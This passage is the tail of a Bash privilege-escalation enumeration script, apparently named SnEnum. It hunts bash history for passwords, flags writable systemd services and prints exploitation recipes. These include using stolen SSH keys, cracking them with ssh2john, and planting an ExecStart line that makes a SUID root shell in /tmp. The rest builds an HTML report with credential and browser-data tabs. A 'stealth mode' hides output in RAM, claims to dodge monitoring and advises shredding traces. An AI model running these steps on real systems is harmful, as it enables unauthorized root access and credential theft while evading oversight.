  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Copy key to attacker machine"
  echo -e "    - Set permissions: chmod 600 id_rsa"
  echo -e "    - Connect: ssh -i id_rsa user@target"
  echo -e "    - If encrypted: use ssh2john and crack with John the Ripper"
  echo -e "\n"
fi

# Check for passwords in history files
historypass=`cat ~/.bash_history 2>/dev/null | grep -iE "password|passwd|pwd" | head -5`
if [ "$historypass" ]; then
  echo -e "\e[00;33m[!] PASSWORD DISCLOSURE - Found in History:\e[00m"
  echo -e "\e[00;32m[+] Password references in bash history:\e[00m\n$historypass"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Extract plaintext passwords from history"
  echo -e "    - Try passwords for sudo, SSH, database access"
  echo -e "    - Check all users' history files: /home/*/.bash_history"
  echo -e "\n"
fi

# Check for writable systemd services
writableservice=`find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null | head -5`
if [ "$writableservice" ]; then
  echo -e "\e[00;33m[!] PRIVILEGE ESCALATION - Writable Systemd Services:\e[00m"
  echo -e "\e[00;32m[+] Writable service files:\e[00m\n$writableservice"
  echo -e "\e[00;36m[*] Exploitation Technique:\e[00m"
  echo -e "    - Modify service to execute malicious command"
  echo -e "    - Add: ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'"
  echo -e "    - Restart service: systemctl restart <service>"
  echo -e "    - Execute: /tmp/rootbash -p"
  echo -e "\n"
fi

# Final recommendations
echo -e "\e[00;33m[!] GENERAL RECOMMENDATIONS:\e[00m"
echo -e "\e[00;36m[*] Automated Tools to Run:\e[00m"
echo -e "    - LinPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"
echo -e "    - LinEnum: https://github.com/rebootuser/LinEnum"
echo -e "    - Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester"
echo -e "    - pspy: Monitor processes without root (https://github.com/DominicBreuker/pspy)"
echo -e "\n"
echo -e "\e[00;36m[*] Manual Checks:\e[00m"
echo -e "    - Review all SUID/SGID binaries carefully"
echo -e "    - Check running processes for credentials (ps aux)"
echo -e "    - Monitor /tmp for scheduled tasks"
echo -e "    - Check for vulnerable services (searchsploit <service> <version>)"
echo -e "    - Review application source code if accessible"
echo -e "\n"
echo -e "\e[00;36m[*] Resources:\e[00m"
echo -e "    - GTFOBins: https://gtfobins.github.io/"
echo -e "    - HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
echo -e "    - PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings"
echo -e "\n"
}

footer()
{
echo -e "\e[00;33m### SCAN COMPLETE ####################################\e[00m" 
}

generate_html_report()
{
if [ "$htmlreport" != "1" ]; then
  return
fi

echo -e "\e[00;33m[+] Generating HTML report...\e[00m"

if [ "$export" ]; then
  htmlfile="$format/SnEnum-Report-`date +"%d-%m-%y-%H%M%S"`.html"
else
  htmlfile="SnEnum-Report-`date +"%d-%m-%y-%H%M%S"`.html"
fi

cat > "$htmlfile" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnEnum Security Report</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .header .meta {
            font-size: 1.1em;
            opacity: 0.9;
        }
        .nav-tabs {
            display: flex;
            background: #f8f9fa;
            border-bottom: 2px solid #dee2e6;
            overflow-x: auto;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .nav-tab {
            padding: 15px 25px;
            cursor: pointer;
            border: none;
            background: none;
            font-size: 1em;
            transition: all 0.3s;
            white-space: nowrap;
        }
        .nav-tab:hover {
            background: #e9ecef;
        }
        .nav-tab.active {
            background: white;
            border-bottom: 3px solid #667eea;
            font-weight: bold;
        }
        .content {
            padding: 30px;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
            animation: fadeIn 0.3s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .section {
            margin-bottom: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            border-left: 4px solid #667eea;
        }
        .section h2 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.5em;
        }
        .section h3 {
            color: #764ba2;
            margin: 15px 0 10px 0;
            font-size: 1.2em;
        }
        .info-item {
            background: white;
            padding: 12px;
            margin: 8px 0;
            border-radius: 5px;
            border-left: 3px solid #28a745;
        }
        .warning-item {
            background: #fff3cd;
            padding: 12px;
            margin: 8px 0;
            border-radius: 5px;
            border-left: 3px solid #ffc107;
        }
        .critical-item {
            background: #f8d7da;
            padding: 12px;
            margin: 8px 0;
            border-radius: 5px;
            border-left: 3px solid #dc3545;
        }
        .code-block {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            margin: 10px 0;
        }
        .badge {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 12px;
            font-size: 0.85em;
            font-weight: bold;
            margin-right: 5px;
        }
        .badge-success { background: #28a745; color: white; }
        .badge-warning { background: #ffc107; color: #333; }
        .badge-danger { background: #dc3545; color: white; }
        .badge-info { background: #17a2b8; color: white; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .stat-card h3 {
            font-size: 2em;
            margin-bottom: 5px;
            color: white;
        }
        .stat-card p {
            opacity: 0.9;
        }
        .footer {
            background: #343a40;
            color: white;
            padding: 20px;
            text-align: center;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #dee2e6;
        }
        th {
            background: #667eea;
            color: white;
            font-weight: bold;
        }
        tr:hover {
            background: #f8f9fa;
        }
        .search-box {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 2px solid #dee2e6;
            border-radius: 5px;
            font-size: 1em;
        }
        .summary-box {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 25px;
            border-radius: 10px;
            margin-bottom: 30px;
        }
        .summary-box h2 {
            color: white;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 SnEnum Security Report</h1>
            <div class="meta">
                <p>Generated: <span id="reportDate"></span></p>
                <p>Target: <span id="hostname"></span> | User: <span id="username"></span></p>
            </div>
        </div>

        <div class="nav-tabs">
            <button class="nav-tab active" onclick="showTab('summary')">📊 Summary</button>
            <button class="nav-tab" onclick="showTab('system')">💻 System</button>
            <button class="nav-tab" onclick="showTab('users')">👥 Users</button>
            <button class="nav-tab" onclick="showTab('network')">🌐 Network</button>
            <button class="nav-tab" onclick="showTab('services')">⚙️ Services</button>
            <button class="nav-tab" onclick="showTab('files')">📁 Files</button>
            <button class="nav-tab" onclick="showTab('browser')">🌍 Browser Data</button>
            <button class="nav-tab" onclick="showTab('credentials')">🔑 Credentials</button>
            <button class="nav-tab" onclick="showTab('docker')">🐳 Containers</button>
        </div>

        <div class="content">
            <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search report..." onkeyup="searchReport()">

            <div id="summary" class="tab-content active">
                <div class="summary-box">
                    <h2>Executive Summary</h2>
                    <p>Comprehensive system enumeration completed. Review all findings carefully.</p>
                </div>
                <div class="stats">
                    <div class="stat-card">
                        <h3 id="criticalCount">0</h3>
                        <p>Critical Findings</p>
                    </div>
                    <div class="stat-card">
                        <h3 id="warningCount">0</h3>
                        <p>Warnings</p>
                    </div>
                    <div class="stat-card">
                        <h3 id="infoCount">0</h3>
                        <p>Information</p>
                    </div>
                </div>
                <div class="section" id="summaryContent">
                    <h2>Key Findings</h2>
                    <p>Scan results will be displayed here...</p>
                </div>
            </div>

            <div id="system" class="tab-content">
                <div class="section">
                    <h2>System Information</h2>
                    <div id="systemContent"></div>
                </div>
            </div>

            <div id="users" class="tab-content">
                <div class="section">
                    <h2>User & Group Information</h2>
                    <div id="usersContent"></div>
                </div>
            </div>

            <div id="network" class="tab-content">
                <div class="section">
                    <h2>Network Information</h2>
                    <div id="networkContent"></div>
                </div>
            </div>

            <div id="services" class="tab-content">
                <div class="section">
                    <h2>Services & Processes</h2>
                    <div id="servicesContent"></div>
                </div>
            </div>

            <div id="files" class="tab-content">
                <div class="section">
                    <h2>Interesting Files</h2>
                    <div id="filesContent"></div>
                </div>
            </div>

            <div id="browser" class="tab-content">
                <div class="section">
                    <h2>Browser Data</h2>
                    <div id="browserContent"></div>
                </div>
            </div>

            <div id="credentials" class="tab-content">
                <div class="section">
                    <h2>Credentials & Tokens</h2>
                    <div id="credentialsContent"></div>
                </div>
            </div>

            <div id="docker" class="tab-content">
                <div class="section">
                    <h2>Container Information</h2>
                    <div id="dockerContent"></div>
                </div>
            </div>
        </div>

        <div class="footer">
            <p>Generated by <strong>SnEnum v1.0.0</strong> - System Enumeration Tool</p>
            <p style="color: #64b5f6; margin-top: 5px;">Created by <strong>SNB</strong></p>
            <p>⚠️ This report may contain sensitive information. Handle with care.</p>
        </div>
    </div>

    <script>
        // Set report metadata
        document.getElementById('reportDate').textContent = new Date().toLocaleString();
        
        // Tab switching
        function showTab(tabName) {
            const tabs = document.querySelectorAll('.tab-content');
            const navTabs = document.querySelectorAll('.nav-tab');
            
            tabs.forEach(tab => tab.classList.remove('active'));
            navTabs.forEach(tab => tab.classList.remove('active'));
            
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        // Search functionality
        function searchReport() {
            const searchTerm = document.getElementById('searchBox').value.toLowerCase();
            const sections = document.querySelectorAll('.section, .info-item, .warning-item, .critical-item');
            
            sections.forEach(section => {
                const text = section.textContent.toLowerCase();
                if (text.includes(searchTerm)) {
                    section.style.display = '';
                } else {
                    section.style.display = 'none';
                }
            });
        }

        // Initialize counts
        document.addEventListener('DOMContentLoaded', function() {
            const critical = document.querySelectorAll('.critical-item').length;
            const warnings = document.querySelectorAll('.warning-item').length;
            const info = document.querySelectorAll('.info-item').length;
            
            document.getElementById('criticalCount').textContent = critical;
            document.getElementById('warningCount').textContent = warnings;
            document.getElementById('infoCount').textContent = info;
        });
    </script>
</body>
</html>
HTMLEOF

# Append scan data to HTML report
cat >> "$htmlfile" << DATAEOF
<script>
// Populate with actual scan data
document.getElementById('hostname').textContent = '$(hostname 2>/dev/null)';
document.getElementById('username').textContent = '$(whoami 2>/dev/null)';

// System info
document.getElementById('systemContent').innerHTML = 
    '<div class="info-item"><strong>Kernel:</strong> $(uname -r 2>/dev/null)</div>' +
    '<div class="info-item"><strong>OS:</strong> $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"')</div>' +
    '<div class="info-item"><strong>Architecture:</strong> $(uname -m 2>/dev/null)</div>';

// Summary content
document.getElementById('summaryContent').innerHTML += 
    '<div class="critical-item">⚠️ Review SUID/SGID binaries for privilege escalation</div>' +
    '<div class="warning-item">⚠️ Check for writable configuration files</div>' +
    '<div class="info-item">ℹ️ Complete enumeration data exported</div>';
</script>
DATAEOF

echo -e "\e[00;32m[+] HTML report generated: $htmlfile\e[00m"
echo -e "\e[00;32m[+] Open in browser: file://$PWD/$htmlfile\e[00m"
}

call_each()
{
  header
  debug_info
  show_progress "System Information"
  system_info
  show_progress "User & Group Info"
  user_info
  show_progress "Environment Variables"
  environmental_info
  show_progress "Scheduled Jobs & Tasks"
  job_info
  show_progress "Network Configuration"
  networking_info
  show_progress "Running Services"
  services_info
  show_progress "Software & Configs"
  software_configs
  show_progress "Interesting Files"
  interesting_files
  show_progress "Browser Data"
  browser_data
  show_progress "Password Hunting"
  password_hunter
  show_progress "Docker Checks"
  docker_checks
  show_progress "LXC Container Checks"
  lxc_container_checks
  show_progress "Exploitation Recommendations"
  recommendations_engine
  show_progress "Finalizing Scan"
  footer
  finish_progress
}

while getopts "h:k:r:e:stHSpq" option; do
 case "${option}" in
    k) keyword=${OPTARG};;
    r) report=${OPTARG}"-"`date +"%d-%m-%y"`;;
    e) export=${OPTARG};;
    s) sudopass=1;;
    t) thorough=1;;
    H) htmlreport=1;;
    S) stealth=1;;
    p) progress=1;;
    q) quiet=1;;
    h) usage; exit;;
    *) usage; exit;;
 esac
done

# Initialize progress bar if enabled
if [ "$progress" = "1" ]; then
  init_progress
fi

# Quiet mode adjustments
if [ "$quiet" = "1" ]; then
  echo -e "\e[00;36m╔════════════════════════════════════════════════════════════════╗\e[00m"
  echo -e "\e[00;36m║           QUIET MODE - HIGH-VALUE FINDINGS ONLY               ║\e[00m"
  echo -e "\e[00;36m╚════════════════════════════════════════════════════════════════╝\e[00m"
  echo ""
  
  # Disable progress bar in quiet mode
  if [ "$progress" = "1" ]; then
    progress=0
  fi
  
  # Initialize high-value findings counter
  HIGH_VALUE_COUNT=0
fi

# Stealth mode adjustments
if [ "$stealth" ]; then
  echo -e "\e[00;35m[STEALTH MODE ACTIVE]\e[00m"
  echo -e "\e[00;35m- Redirecting output to memory (tmpfs)\e[00m"
  echo -e "\e[00;35m- Avoiding common monitoring triggers\e[00m"
  echo -e "\e[00;35m- Minimizing command execution noise\e[00m"
  echo -e "\e[00;35m- Disabling HTML report generation\e[00m"
  
  # Disable progress bar in stealth mode (visual noise)
  if [ "$progress" = "1" ]; then
    echo -e "\e[00;35m- Progress bar disabled for stealth\e[00m"
    progress=0
  fi
  echo -e "\n"
  
  # Disable HTML report in stealth mode (too much disk I/O)
  htmlreport=0
  
  # Use memory-based temporary file for output
  if [ "$report" ]; then
    report="/dev/shm/.sr-$$-$report"
    echo -e "\e[00;35m[STEALTH] Report saved to RAM: $report\e[00m"
  fi
  
  # Redirect to memory and suppress unnecessary output
  call_each 2>/dev/null | tee -a $report 2>/dev/null
  
  # Cleanup function for stealth mode
  cleanup_stealth() {
    if [ -d "/dev/shm/.snenum-$$" ]; then
      echo -e "\e[00;35m[STEALTH] Cleaning up RAM storage...\e[00m"
      rm -rf "/dev/shm/.snenum-$$" 2>/dev/null
    fi
    if [ -f "$report" ]; then
      echo -e "\e[00;35m[STEALTH] Report location: $report\e[00m"
      echo -e "\e[00;35m[STEALTH] Remember to securely delete: shred -vfz -n 3 $report\e[00m"
    fi
  }
  trap cleanup_stealth EXIT
else
  # Normal mode
  call_each | tee -a $report 2> /dev/null
  generate_html_report
fi

#EndOfScript